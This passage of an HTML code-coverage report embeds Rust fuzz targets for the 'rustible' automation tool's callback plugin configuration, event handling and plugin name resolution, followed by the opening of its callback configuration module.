<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <style>:root {
  --color: black;
  --bg: white;
  --head-bg: white;
  --link: #338;

  --blue: #ccf;
  --red: #fcc;
  --yellow: #ffc;
  --green: #cfc;
}

[data-theme='dark'] {
  --color: white;
  --bg: black;
  --head-bg: #333;
  --link: #aaf;

  --blue: #225;
  --red: #522;
  --yellow: #552;
  --green: #252;
}

html,
body {
  margin: 0;
  padding: 0;
  color: var(--color);
  background: var(--bg);
}

.app {
  margin: 10px;
  padding: 0;
}

.files-list {
  margin: 10px 0 0;
  width: 100%;
  border-collapse: collapse;
}
.files-list__head {
  border: 1px solid #999;
}
.files-list__head > tr > th {
  padding: 10px;
  border: 1px solid #999;
  text-align: left;
  font-weight: normal;
  background: var(--head-bg);
}
.files-list__body {
}
.files-list__file {
  cursor: pointer;
}
.files-list__file:hover {
  background: var(--blue);
}
.files-list__file > td {
  padding: 10px;
  border: 1px solid #999;
}
.files-list__file > td:first-child::before {
  content: '\01F4C4';
  margin-right: 1em;
}
.files-list__file_low {
  background: var(--red);
}
.files-list__file_medium {
  background: var(--yellow);
}
.files-list__file_high {
  background: var(--green);
}
.files-list__file_folder > td:first-child::before {
  content: '\01F4C1';
  margin-right: 1em;
}

.file-header {
  border: 1px solid #999;
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: sticky;
  top: 0;
  background: var(--bg);
}

.file-header__back {
  margin: 10px;
  cursor: pointer;
  flex-shrink: 0;
  flex-grow: 0;
  text-decoration: underline;
  color: var(--link);
}

.file-header__name {
  margin: 10px;
  flex-shrink: 2;
  flex-grow: 2;
}

.file-header__stat {
  margin: 10px;
  flex-shrink: 0;
  flex-grow: 0;
}

.file-content {
  margin: 10px 0 0;
  border: 1px solid #999;
  padding: 10px;
  counter-reset: line;
  display: flex;
  flex-direction: column;
}

.code-line::before {
  content: counter(line);
  margin-right: 10px;
}
.code-line {
  margin: 0;
  padding: 0.3em;
  height: 1em;
  counter-increment: line;
}
.code-line_covered {
  background: var(--green);
}
.code-line_uncovered {
  background: var(--red);
}

#theme-toggle-label {
  margin-left: 1ch;
}
</style>
</head>
<body>
    <div id="root"></div>
    <script>
        var data = {"files":[{"path":["/","home","artur","Repositories","rustible","fuzz","fuzz_targets","fuzz_callback_config.rs"],"content":"//! Fuzz target for callback configuration parsing.\n//!\n//! This fuzzer tests configuration parsing robustness with arbitrary input.\n\n#![no_main]\n\nuse libfuzzer_sys::fuzz_target;\nuse arbitrary::{Arbitrary, Unstructured};\nuse std::collections::HashMap;\n\n/// Arbitrary callback configuration for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzCallbackConfig {\n    plugin: String,\n    output: String,\n    verbosity: u8,\n    show_diff: bool,\n    check_mode: bool,\n    options: Vec\u003c(String, FuzzConfigValue)\u003e,\n}\n\n/// Arbitrary config value types for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nenum FuzzConfigValue {\n    Bool(bool),\n    Int(i64),\n    Float(f64),\n    String(String),\n    Array(Vec\u003cString\u003e),\n    Null,\n}\n\n/// Arbitrary verbosity level\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzVerbosity(u8);\n\n/// Arbitrary priority for plugin ordering\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzPluginPriority(i32);\n\nfuzz_target!(|data: \u0026[u8]| {\n    if data.is_empty() {\n        return;\n    }\n\n    let mut unstructured = Unstructured::new(data);\n\n    // Test callback config parsing\n    if let Ok(config) = FuzzCallbackConfig::arbitrary(\u0026mut unstructured) {\n        // Validate plugin name\n        let plugin_name = config.plugin.trim().to_lowercase();\n        let _ = match plugin_name.as_str() {\n            \"default\" | \"minimal\" | \"oneline\" | \"json\" | \"yaml\" |\n            \"timer\" | \"tree\" | \"diff\" | \"junit\" | \"notification\" |\n            \"dense\" | \"forked\" | \"selective\" | \"counter\" | \"null\" =\u003e true,\n            _ =\u003e false,\n        };\n\n        // Validate output destination\n        let output = config.output.trim();\n        let is_stdout = output == \"stdout\" || output.is_empty();\n        let is_stderr = output == \"stderr\";\n        let is_file = !is_stdout \u0026\u0026 !is_stderr;\n        let _ = (is_stdout, is_stderr, is_file);\n\n        // Validate verbosity level (0-5)\n        let verbosity = config.verbosity.min(5);\n        let _ = verbosity;\n\n        // Process options\n        let mut options_map: HashMap\u003cString, String\u003e = HashMap::new();\n        for (key, value) in \u0026config.options {\n            let key = key.trim().to_lowercase();\n            if !key.is_empty() {\n                let value_str = match value {\n                    FuzzConfigValue::Bool(b) =\u003e b.to_string(),\n                    FuzzConfigValue::Int(i) =\u003e i.to_string(),\n                    FuzzConfigValue::Float(f) =\u003e {\n                        if f.is_finite() {\n                            f.to_string()\n                        } else {\n                            \"0\".to_string()\n                        }\n                    }\n                    FuzzConfigValue::String(s) =\u003e s.clone(),\n                    FuzzConfigValue::Array(arr) =\u003e arr.join(\",\"),\n                    FuzzConfigValue::Null =\u003e String::new(),\n                };\n                options_map.insert(key, value_str);\n            }\n        }\n\n        // Validate specific option patterns\n        if let Some(indent_str) = options_map.get(\"indent\") {\n            let _ = indent_str.parse::\u003cusize\u003e().unwrap_or(0);\n        }\n\n        if let Some(width_str) = options_map.get(\"width\") {\n            let _ = width_str.parse::\u003cusize\u003e().unwrap_or(80);\n        }\n\n        if let Some(timeout_str) = options_map.get(\"timeout\") {\n            let _ = timeout_str.parse::\u003cu64\u003e().unwrap_or(30);\n        }\n    }\n\n    // Test verbosity level handling\n    if let Ok(verbosity) = FuzzVerbosity::arbitrary(\u0026mut unstructured) {\n        let level = verbosity.0;\n        let verbosity_name = match level {\n            0 =\u003e \"Normal\",\n            1 =\u003e \"Verbose\",\n            2 =\u003e \"MoreVerbose\",\n            3 =\u003e \"Debug\",\n            4 =\u003e \"ConnectionDebug\",\n            _ =\u003e \"Max\",\n        };\n        let _ = verbosity_name;\n    }\n\n    // Test priority ordering\n    if let Ok(priority) = FuzzPluginPriority::arbitrary(\u0026mut unstructured) {\n        let p = priority.0;\n        let priority_name = if p \u003c= 100 {\n            \"stdout\"\n        } else if p \u003c= 200 {\n            \"logging\"\n        } else if p \u003c= 500 {\n            \"normal\"\n        } else if p \u003c= 700 {\n            \"metrics\"\n        } else {\n            \"cleanup\"\n        };\n        let _ = priority_name;\n    }\n});\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","fuzz","fuzz_targets","fuzz_callback_event.rs"],"content":"//! Fuzz target for callback event type parsing and handling.\n//!\n//! This fuzzer tests the robustness of callback event creation and processing\n//! with arbitrary input data.\n\n#![no_main]\n\nuse libfuzzer_sys::fuzz_target;\nuse arbitrary::{Arbitrary, Unstructured};\nuse std::time::Duration;\n\n/// Arbitrary event type for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nenum FuzzEventType {\n    PlaybookStart,\n    PlaybookEnd,\n    PlayStart,\n    PlayEnd,\n    TaskStart,\n    TaskComplete,\n    TaskFailed,\n    TaskSkipped,\n    TaskUnreachable,\n    HandlerTriggered,\n    FactsGathered,\n    Warning,\n    Deprecation,\n    Verbose,\n}\n\n/// Arbitrary task status for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nenum FuzzTaskStatus {\n    Ok,\n    Changed,\n    Failed,\n    Skipped,\n    Unreachable,\n}\n\n/// Arbitrary task event data for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzTaskEvent {\n    host: String,\n    task_name: String,\n    module: String,\n    status: FuzzTaskStatus,\n    changed: bool,\n    message: String,\n    duration_ms: u64,\n    warnings: Vec\u003cString\u003e,\n    notify: Vec\u003cString\u003e,\n}\n\n/// Arbitrary play stats for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzPlayStats {\n    host: String,\n    ok: u32,\n    changed: u32,\n    failed: u32,\n    skipped: u32,\n    unreachable: u32,\n}\n\nfuzz_target!(|data: \u0026[u8]| {\n    if data.is_empty() {\n        return;\n    }\n\n    let mut unstructured = Unstructured::new(data);\n\n    // Test event type parsing\n    if let Ok(event_type) = FuzzEventType::arbitrary(\u0026mut unstructured) {\n        let _ = format!(\"{:?}\", event_type);\n    }\n\n    // Test task status parsing\n    if let Ok(status) = FuzzTaskStatus::arbitrary(\u0026mut unstructured) {\n        let _ = format!(\"{:?}\", status);\n    }\n\n    // Test task event creation with arbitrary data\n    if let Ok(event) = FuzzTaskEvent::arbitrary(\u0026mut unstructured) {\n        // Validate host name handling\n        let _ = event.host.trim();\n        let _ = event.host.is_empty();\n        let _ = event.host.len();\n\n        // Validate task name handling\n        let _ = event.task_name.trim();\n        let _ = event.task_name.is_empty();\n\n        // Validate module name handling\n        let _ = event.module.trim();\n\n        // Validate message handling\n        let _ = event.message.trim();\n\n        // Validate duration\n        let duration = Duration::from_millis(event.duration_ms);\n        let _ = duration.as_secs();\n\n        // Validate warnings\n        for warning in \u0026event.warnings {\n            let _ = warning.trim();\n        }\n\n        // Validate notify handlers\n        for handler in \u0026event.notify {\n            let _ = handler.trim();\n        }\n\n        // Test status string conversion\n        let status_str = match event.status {\n            FuzzTaskStatus::Ok =\u003e \"OK\",\n            FuzzTaskStatus::Changed =\u003e \"CHANGED\",\n            FuzzTaskStatus::Failed =\u003e \"FAILED\",\n            FuzzTaskStatus::Skipped =\u003e \"SKIPPED\",\n            FuzzTaskStatus::Unreachable =\u003e \"UNREACHABLE\",\n        };\n        let _ = status_str.to_lowercase();\n    }\n\n    // Test play stats with arbitrary data\n    if let Ok(stats) = FuzzPlayStats::arbitrary(\u0026mut unstructured) {\n        // Validate stats calculations\n        let total = stats.ok\n            .saturating_add(stats.changed)\n            .saturating_add(stats.failed)\n            .saturating_add(stats.skipped)\n            .saturating_add(stats.unreachable);\n        let _ = total;\n\n        // Check for failures\n        let has_failures = stats.failed \u003e 0 || stats.unreachable \u003e 0;\n        let _ = has_failures;\n\n        // Validate host name\n        let _ = stats.host.trim();\n    }\n});\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","fuzz","fuzz_targets","fuzz_large_event_data.rs"],"content":"//! Fuzz target for large event data handling.\n//!\n//! This fuzzer tests the callback system's ability to handle large amounts\n//! of event data without crashes or excessive memory usage.\n\n#![no_main]\n\nuse libfuzzer_sys::fuzz_target;\nuse arbitrary::{Arbitrary, Unstructured};\nuse std::collections::HashMap;\n\n/// Maximum sizes to prevent OOM during fuzzing\nconst MAX_STRING_SIZE: usize = 65536;\nconst MAX_ARRAY_SIZE: usize = 1024;\nconst MAX_MAP_SIZE: usize = 256;\nconst MAX_DEPTH: usize = 16;\n\n/// Arbitrary JSON-like value for fuzzing large data structures\n#[derive(Debug, Clone)]\nenum FuzzJsonValue {\n    Null,\n    Bool(bool),\n    Int(i64),\n    Float(f64),\n    String(String),\n    Array(Vec\u003cFuzzJsonValue\u003e),\n    Object(HashMap\u003cString, FuzzJsonValue\u003e),\n}\n\nimpl\u003c'a\u003e Arbitrary\u003c'a\u003e for FuzzJsonValue {\n    fn arbitrary(u: \u0026mut Unstructured\u003c'a\u003e) -\u003e arbitrary::Result\u003cSelf\u003e {\n        Self::arbitrary_with_depth(u, 0)\n    }\n}\n\nimpl FuzzJsonValue {\n    fn arbitrary_with_depth(u: \u0026mut Unstructured\u003c'_\u003e, depth: usize) -\u003e arbitrary::Result\u003cSelf\u003e {\n        if depth \u003e= MAX_DEPTH {\n            // At max depth, only allow leaf types\n            let choice: u8 = u.int_in_range(0..=3)?;\n            return match choice {\n                0 =\u003e Ok(FuzzJsonValue::Null),\n                1 =\u003e Ok(FuzzJsonValue::Bool(bool::arbitrary(u)?)),\n                2 =\u003e Ok(FuzzJsonValue::Int(i64::arbitrary(u)?)),\n                _ =\u003e {\n                    let len = u.int_in_range(0..=128)?;\n                    let s: String = (0..len)\n                        .map(|_| u.int_in_range(32u8..=126u8).map(|c| c as char))\n                        .collect::\u003cResult\u003c_, _\u003e\u003e()?;\n                    Ok(FuzzJsonValue::String(s))\n                }\n            };\n        }\n\n        let choice: u8 = u.int_in_range(0..=6)?;\n        match choice {\n            0 =\u003e Ok(FuzzJsonValue::Null),\n            1 =\u003e Ok(FuzzJsonValue::Bool(bool::arbitrary(u)?)),\n            2 =\u003e Ok(FuzzJsonValue::Int(i64::arbitrary(u)?)),\n            3 =\u003e {\n                let f = f64::arbitrary(u)?;\n                Ok(FuzzJsonValue::Float(if f.is_finite() { f } else { 0.0 }))\n            }\n            4 =\u003e {\n                let len = u.int_in_range(0..=MAX_STRING_SIZE.min(1024))?;\n                let s: String = (0..len)\n                    .map(|_| u.int_in_range(32u8..=126u8).map(|c| c as char))\n                    .collect::\u003cResult\u003c_, _\u003e\u003e()?;\n                Ok(FuzzJsonValue::String(s))\n            }\n            5 =\u003e {\n                let len = u.int_in_range(0..=MAX_ARRAY_SIZE.min(32))?;\n                let arr: Vec\u003cFuzzJsonValue\u003e = (0..len)\n                    .map(|_| Self::arbitrary_with_depth(u, depth + 1))\n                    .collect::\u003cResult\u003c_, _\u003e\u003e()?;\n                Ok(FuzzJsonValue::Array(arr))\n            }\n            _ =\u003e {\n                let len = u.int_in_range(0..=MAX_MAP_SIZE.min(16))?;\n                let mut map = HashMap::new();\n                for _ in 0..len {\n                    let key_len = u.int_in_range(1..=64)?;\n                    let key: String = (0..key_len)\n                        .map(|_| u.int_in_range(97u8..=122u8).map(|c| c as char))\n                        .collect::\u003cResult\u003c_, _\u003e\u003e()?;\n                    let value = Self::arbitrary_with_depth(u, depth + 1)?;\n                    map.insert(key, value);\n                }\n                Ok(FuzzJsonValue::Object(map))\n            }\n        }\n    }\n\n    fn approximate_size(\u0026self) -\u003e usize {\n        match self {\n            FuzzJsonValue::Null =\u003e 4,\n            FuzzJsonValue::Bool(_) =\u003e 5,\n            FuzzJsonValue::Int(n) =\u003e n.to_string().len(),\n            FuzzJsonValue::Float(f) =\u003e f.to_string().len(),\n            FuzzJsonValue::String(s) =\u003e s.len() + 2,\n            FuzzJsonValue::Array(arr) =\u003e {\n                2 + arr.iter().map(|v| v.approximate_size() + 1).sum::\u003cusize\u003e()\n            }\n            FuzzJsonValue::Object(map) =\u003e {\n                2 + map.iter()\n                    .map(|(k, v)| k.len() + 3 + v.approximate_size() + 1)\n                    .sum::\u003cusize\u003e()\n            }\n        }\n    }\n}\n\n/// Large task result for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzLargeTaskResult {\n    host: String,\n    task_name: String,\n    module: String,\n    success: bool,\n    changed: bool,\n    skipped: bool,\n    message: String,\n    stdout_lines: Vec\u003cString\u003e,\n    stderr_lines: Vec\u003cString\u003e,\n    warnings: Vec\u003cString\u003e,\n    notify: Vec\u003cString\u003e,\n}\n\n/// Large fact set for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzLargeFacts {\n    hostname: String,\n    ip_addresses: Vec\u003cString\u003e,\n    interfaces: Vec\u003c(String, String)\u003e,\n    mounts: Vec\u003c(String, String, u64)\u003e,\n    packages: Vec\u003c(String, String)\u003e,\n    services: Vec\u003c(String, bool)\u003e,\n    users: Vec\u003c(String, u32)\u003e,\n    environment: Vec\u003c(String, String)\u003e,\n}\n\nfuzz_target!(|data: \u0026[u8]| {\n    if data.len() \u003c 4 {\n        return;\n    }\n\n    let mut unstructured = Unstructured::new(data);\n\n    // Test large JSON-like data handling\n    if let Ok(json_value) = FuzzJsonValue::arbitrary(\u0026mut unstructured) {\n        let size = json_value.approximate_size();\n\n        // Ensure we can handle the data without panicking\n        let _ = format!(\"{:?}\", json_value);\n\n        // Test size calculations\n        let _ = size;\n\n        // Simulate JSON serialization size check\n        let size_ok = size \u003c= 10_000_000; // 10MB limit\n        let _ = size_ok;\n    }\n\n    // Test large task result handling\n    if let Ok(result) = FuzzLargeTaskResult::arbitrary(\u0026mut unstructured) {\n        // Validate string lengths\n        let host_len = result.host.len();\n        let task_name_len = result.task_name.len();\n        let module_len = result.module.len();\n        let message_len = result.message.len();\n\n        let _ = (host_len, task_name_len, module_len, message_len);\n\n        // Calculate total stdout size\n        let stdout_size: usize = result.stdout_lines.iter().map(|s| s.len()).sum();\n        let stderr_size: usize = result.stderr_lines.iter().map(|s| s.len()).sum();\n        let warnings_size: usize = result.warnings.iter().map(|s| s.len()).sum();\n\n        let _ = (stdout_size, stderr_size, warnings_size);\n\n        // Simulate truncation for large outputs\n        let max_output_size = 1_000_000; // 1MB\n        let should_truncate_stdout = stdout_size \u003e max_output_size;\n        let should_truncate_stderr = stderr_size \u003e max_output_size;\n\n        let _ = (should_truncate_stdout, should_truncate_stderr);\n\n        // Test notify handler list\n        for handler in \u0026result.notify {\n            let valid_handler = !handler.is_empty()\n                \u0026\u0026 handler.len() \u003c= 256\n                \u0026\u0026 handler.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-' || c == ' ');\n            let _ = valid_handler;\n        }\n    }\n\n    // Test large facts handling\n    if let Ok(facts) = FuzzLargeFacts::arbitrary(\u0026mut unstructured) {\n        // Count total fact entries\n        let total_entries = 1  // hostname\n            + facts.ip_addresses.len()\n            + facts.interfaces.len()\n            + facts.mounts.len()\n            + facts.packages.len()\n            + facts.services.len()\n            + facts.users.len()\n            + facts.environment.len();\n\n        let _ = total_entries;\n\n        // Calculate total size\n        let hostname_size = facts.hostname.len();\n        let ip_size: usize = facts.ip_addresses.iter().map(|s| s.len()).sum();\n        let interface_size: usize = facts.interfaces.iter().map(|(n, a)| n.len() + a.len()).sum();\n        let mount_size: usize = facts.mounts.iter().map(|(d, m, _)| d.len() + m.len() + 8).sum();\n        let package_size: usize = facts.packages.iter().map(|(n, v)| n.len() + v.len()).sum();\n\n        let total_size = hostname_size + ip_size + interface_size + mount_size + package_size;\n        let _ = total_size;\n\n        // Validate IP address format (basic check)\n        for ip in \u0026facts.ip_addresses {\n            let parts: Vec\u003c\u0026str\u003e = ip.split('.').collect();\n            let is_valid_ipv4 = parts.len() == 4 \u0026\u0026 parts.iter().all(|p| p.parse::\u003cu8\u003e().is_ok());\n            let _ = is_valid_ipv4;\n        }\n\n        // Validate interface names\n        for (name, _) in \u0026facts.interfaces {\n            let is_valid_name = !name.is_empty()\n                \u0026\u0026 name.len() \u003c= 16\n                \u0026\u0026 name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-');\n            let _ = is_valid_name;\n        }\n\n        // Validate mount paths\n        for (device, mountpoint, size) in \u0026facts.mounts {\n            let is_valid_mount = !device.is_empty()\n                \u0026\u0026 !mountpoint.is_empty()\n                \u0026\u0026 mountpoint.starts_with('/');\n            let _ = (is_valid_mount, *size);\n        }\n    }\n\n    // Test concurrent event handling simulation\n    if let Ok(event_count) = u16::arbitrary(\u0026mut unstructured) {\n        let count = (event_count as usize).min(1000);\n        let mut events_processed = 0usize;\n\n        for _ in 0..count {\n            if let Ok(host_id) = u8::arbitrary(\u0026mut unstructured) {\n                if let Ok(task_id) = u16::arbitrary(\u0026mut unstructured) {\n                    let host = format!(\"host{}\", host_id);\n                    let task = format!(\"task_{}\", task_id);\n                    let _ = (host, task);\n                    events_processed += 1;\n                }\n            }\n        }\n\n        let _ = events_processed;\n    }\n});\n","traces":[{"line":31,"address":[],"length":0,"stats":{"Line":0}},{"line":32,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":2},{"path":["/","home","artur","Repositories","rustible","fuzz","fuzz_targets","fuzz_plugin_resolution.rs"],"content":"//! Fuzz target for plugin name resolution.\n//!\n//! This fuzzer tests plugin name matching and resolution with arbitrary input.\n\n#![no_main]\n\nuse libfuzzer_sys::fuzz_target;\nuse arbitrary::{Arbitrary, Unstructured};\n\n/// Known plugin names for resolution testing\nconst KNOWN_PLUGINS: \u0026[\u0026str] = \u0026[\n    \"default\",\n    \"minimal\",\n    \"oneline\",\n    \"json\",\n    \"yaml\",\n    \"timer\",\n    \"tree\",\n    \"diff\",\n    \"junit\",\n    \"notification\",\n    \"dense\",\n    \"forked\",\n    \"selective\",\n    \"counter\",\n    \"null\",\n    \"profile_tasks\",\n];\n\n/// Arbitrary plugin name variations for fuzzing\n#[derive(Debug, Clone, Arbitrary)]\nstruct FuzzPluginName {\n    name: String,\n    namespace: Option\u003cString\u003e,\n    version: Option\u003cString\u003e,\n}\n\n/// Plugin matching strategy\n#[derive(Debug, Clone, Arbitrary)]\nenum FuzzMatchStrategy {\n    Exact,\n    CaseInsensitive,\n    Prefix,\n    Suffix,\n    Contains,\n    Regex,\n}\n\nfuzz_target!(|data: \u0026[u8]| {\n    if data.is_empty() {\n        return;\n    }\n\n    let mut unstructured = Unstructured::new(data);\n\n    // Test plugin name resolution\n    if let Ok(plugin) = FuzzPluginName::arbitrary(\u0026mut unstructured) {\n        let name = plugin.name.trim().to_lowercase();\n\n        // Check for exact match\n        let exact_match = KNOWN_PLUGINS.iter().any(|\u0026p| p == name);\n\n        // Check for case-insensitive match\n        let case_insensitive_match = KNOWN_PLUGINS.iter()\n            .any(|\u0026p| p.eq_ignore_ascii_case(\u0026name));\n\n        // Check for prefix match\n        let prefix_match = KNOWN_PLUGINS.iter()\n            .any(|\u0026p| p.starts_with(\u0026name) || name.starts_with(p));\n\n        // Check for suffix match\n        let suffix_match = KNOWN_PLUGINS.iter()\n            .any(|\u0026p| p.ends_with(\u0026name) || name.ends_with(p));\n\n        // Check for contains match\n        let contains_match = KNOWN_PLUGINS.iter()\n            .any(|\u0026p| p.contains(\u0026name) || name.contains(p));\n\n        let _ = (exact_match, case_insensitive_match, prefix_match, suffix_match, contains_match);\n\n        // Handle namespaced plugin names (e.g., \"rustible.callback.json\")\n        if let Some(namespace) = \u0026plugin.namespace {\n            let full_name = format!(\"{}.{}\", namespace.trim(), name);\n            let _ = full_name.split('.').collect::\u003cVec\u003c_\u003e\u003e();\n        }\n\n        // Handle versioned plugin names (e.g., \"json@2.0\")\n        if let Some(version) = \u0026plugin.version {\n            let versioned_name = format!(\"{}@{}\", name, version.trim());\n            let _ = versioned_name.split('@').collect::\u003cVec\u003c_\u003e\u003e();\n\n            // Try to parse version\n            let version_parts: Vec\u003c\u0026str\u003e = version.split('.').collect();\n            if version_parts.len() \u003e= 2 {\n                let _ = version_parts[0].parse::\u003cu32\u003e();\n                let _ = version_parts[1].parse::\u003cu32\u003e();\n            }\n        }\n\n        // Test various name normalizations\n        let normalized_underscore = name.replace('-', \"_\");\n        let normalized_hyphen = name.replace('_', \"-\");\n        let _ = (normalized_underscore, normalized_hyphen);\n\n        // Test plugin name validation rules\n        let is_valid_name = !name.is_empty()\n            \u0026\u0026 name.len() \u003c= 64\n            \u0026\u0026 name.chars().all(|c| c.is_alphanumeric() || c == '_' || c == '-')\n            \u0026\u0026 name.chars().next().map(|c| c.is_alphabetic()).unwrap_or(false);\n        let _ = is_valid_name;\n    }\n\n    // Test matching strategy application\n    if let Ok(strategy) = FuzzMatchStrategy::arbitrary(\u0026mut unstructured) {\n        if let Ok(pattern) = String::arbitrary(\u0026mut unstructured) {\n            let pattern = pattern.trim();\n            if !pattern.is_empty() \u0026\u0026 pattern.len() \u003c= 256 {\n                for \u0026plugin in KNOWN_PLUGINS {\n                    let matched = match strategy {\n                        FuzzMatchStrategy::Exact =\u003e plugin == pattern,\n                        FuzzMatchStrategy::CaseInsensitive =\u003e {\n                            plugin.eq_ignore_ascii_case(pattern)\n                        }\n                        FuzzMatchStrategy::Prefix =\u003e plugin.starts_with(pattern),\n                        FuzzMatchStrategy::Suffix =\u003e plugin.ends_with(pattern),\n                        FuzzMatchStrategy::Contains =\u003e plugin.contains(pattern),\n                        FuzzMatchStrategy::Regex =\u003e {\n                            // Simple pattern matching without full regex\n                            // to avoid regex compilation DoS\n                            if pattern.contains('*') {\n                                let parts: Vec\u003c\u0026str\u003e = pattern.split('*').collect();\n                                if parts.len() == 2 {\n                                    plugin.starts_with(parts[0]) \u0026\u0026 plugin.ends_with(parts[1])\n                                } else {\n                                    false\n                                }\n                            } else {\n                                plugin.contains(pattern)\n                            }\n                        }\n                    };\n                    let _ = matched;\n                }\n            }\n        }\n    }\n\n    // Test alias resolution\n    if let Ok(alias) = String::arbitrary(\u0026mut unstructured) {\n        let alias = alias.trim().to_lowercase();\n        let resolved = match alias.as_str() {\n            \"min\" | \"quiet\" =\u003e Some(\"minimal\"),\n            \"line\" | \"single\" =\u003e Some(\"oneline\"),\n            \"jsn\" | \"machine\" =\u003e Some(\"json\"),\n            \"yml\" | \"human\" =\u003e Some(\"yaml\"),\n            \"time\" | \"timing\" =\u003e Some(\"timer\"),\n            \"hier\" | \"hierarchy\" =\u003e Some(\"tree\"),\n            \"changes\" | \"delta\" =\u003e Some(\"diff\"),\n            \"xml\" | \"test-report\" =\u003e Some(\"junit\"),\n            \"notify\" | \"alert\" =\u003e Some(\"notification\"),\n            \"compact\" | \"brief\" =\u003e Some(\"dense\"),\n            \"parallel\" | \"multi\" =\u003e Some(\"forked\"),\n            \"filter\" | \"filtered\" =\u003e Some(\"selective\"),\n            \"count\" | \"stats\" =\u003e Some(\"counter\"),\n            \"noop\" | \"silent\" =\u003e Some(\"null\"),\n            \"profile\" | \"perf\" =\u003e Some(\"profile_tasks\"),\n            _ =\u003e None,\n        };\n        let _ = resolved;\n    }\n});\n","traces":[],"covered":0,"coverable":0},{"path":["/","home","artur","Repositories","rustible","src","callback","config.rs"],"content":"//! Callback Plugin Configuration\n//!\n//! This module provides a comprehensive configuration system for callback plugins,\n//! supporting multiple configuration sources with proper precedence:\n//!\n//! 1. Default values (lowest priority)\n//! 2. Configuration file (TOML, YAML, or JSON)\n//! 3. Environment variables\n//! 4. CLI arguments (highest priority)\n//!\n//! # Configuration File Format (TOML)\n//!\n//! ```toml\n//! [callbacks]\n//! # Default callback plugin to use\n//! default = \"default\"\n//!\n//! # Enable multiple plugins simultaneously\n//! enabled = [\"default\", \"timer\"]\n//!\n//! # Global verbosity level (0-4)\n//! verbosity = 1\n//!\n//! # Show diff output for changed files\n//! show_diff = false\n//!\n//! # Check mode (dry run)\n//! check_mode = false\n//!\n//! # Output destination: \"stdout\", \"stderr\", or file path\n//! output = \"stdout\"\n//!\n//! # Per-plugin configuration\n//! [callbacks.plugins.timer]\n//! enabled = true\n//! show_per_task = true\n//! show_summary = true\n//! top_slowest = 10\n//! threshold_secs = 0.0\n//!\n//! [callbacks.plugins.json]\n//! enabled = false\n//! output = \"/var/log/rustible/execution.jsonl\"\n//! show_full_result = true\n//! indent = 0\n//!\n//! [callbacks.plugins.profile_tasks]\n//! enabled = false\n//! slow_threshold_secs = 10.0\n//! bottleneck_threshold_secs = 30.0\n//! top_tasks_count = 20\n//! ```\n//!\n//! # Environment Variables\n//!\n//! - `RUSTIBLE_CALLBACK` - Default callback plugin\n//! - `RUSTIBLE_CALLBACKS_ENABLED` - Comma-separated list of enabled plugins\n//! - `RUSTIBLE_CALLBACK_VERBOSITY` - Verbosity level (0-4)\n//! - `RUSTIBLE_CALLBACK_SHOW_DIFF` - Enable diff output (true/false)\n//! - `RUSTIBLE_CALLBACK_OUTPUT` - Output destination\n//! - `RUSTIBLE_CALLBACK_\u003cPLUGIN\u003e_\u003cOPTION\u003e` - Per-plugin options (uppercase)\n//!\n//! # CLI Arguments\n//!\n//! - `--callback \u003cname\u003e` or `-c \u003cname\u003e` - Select callback plugin\n//! - `--callback-config \u003cpath\u003e` - Path to callback configuration file\n//! - `--show-diff` / `--no-diff` - Enable/disable diff output\n//! - `-v`, `-vv`, `-vvv`, `-vvvv` - Increase verbosity\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::config::{CallbackConfig, CallbackConfigLoader};\n//!\n//! // Load from all sources with proper precedence\n//! let config = CallbackConfigLoader::new()\n//!     .with_file(\"/etc/rustible/callbacks.toml\")\n//!     .with_env_prefix(\"RUSTIBLE_CALLBACK\")\n//!     .with_cli_args(\u0026cli_matches)\n//!     .load()?;\n//!\n//! // Access configuration\n//! println!(\"Default plugin: {}\", config.default_plugin);\n//! println!(\"Verbosity: {}\", config.verbosity);\n//!\n//! // Get per-plugin config\n//! if let Some(timer_config) = config.get_plugin_config(\"timer\") {\n//!     println!(\"Timer enabled: {}\", timer_config.enabled);\n//! }\n//! ```\n\nuse std::collections::HashMap;\nuse std::env;\nuse std::fs;\nuse std::path::{Path, PathBuf};\n\nuse anyhow::{Context, Result};\nuse serde::{Deserialize, Serialize};\nuse serde_json::Value as JsonValue;\nuse tracing::{debug, warn};\n\n// ============================================================================\n// Core Configuration Types\n// ============================================================================\n\n/// Main callback configuration structure.\n///\n/// This contains all settings that control callback plugin behavior,\n/// including global settings and per-plugin configurations.\n#[derive(Debug, Clone, Serialize, Deserialize)]\n#[serde(default)]\npub struct CallbackConfig {\n    /// Name of the callback plugin (e.g., \"default\", \"json\", \"minimal\")\n    pub plugin: String,\n\n    /// Default callback plugin to use when none is specified\n    pub default_plugin: String,\n\n    /// List of enabled callback plugins (can run multiple simultaneously)\n    pub enabled_plugins: Vec\u003cString\u003e,\n\n    /// Verbosity level (0 = quiet, 1 = normal, 2 = verbose, 3 = debug, 4 = trace)\n    pub verbosity: u8,\n\n    /// Whether to show diff output for changed files\n    pub show_diff: bool,\n\n    /// Whether we're in check mode (dry run)\n    pub check_mode: bool,\n\n    /// Output destination: \"stdout\", \"stderr\", or a file path\n    pub output: String,\n\n    /// Whether to use colored output\n    pub use_colors: bool,\n\n    /// Whether to display task timing information\n    pub show_task_timing: bool,\n\n    /// Whether to show skipped tasks\n    pub show_skipped: bool,\n\n    /// Whether to show ok tasks (not changed)\n    pub show_ok: bool,\n\n    /// Whether to display play recap at the end\n    pub show_recap: bool,\n\n    /// Per-plugin configuration options\n    #[serde(default)]\n    pub plugins: HashMap\u003cString, PluginConfig\u003e,\n\n    /// Additional arbitrary options (for custom plugins)\n    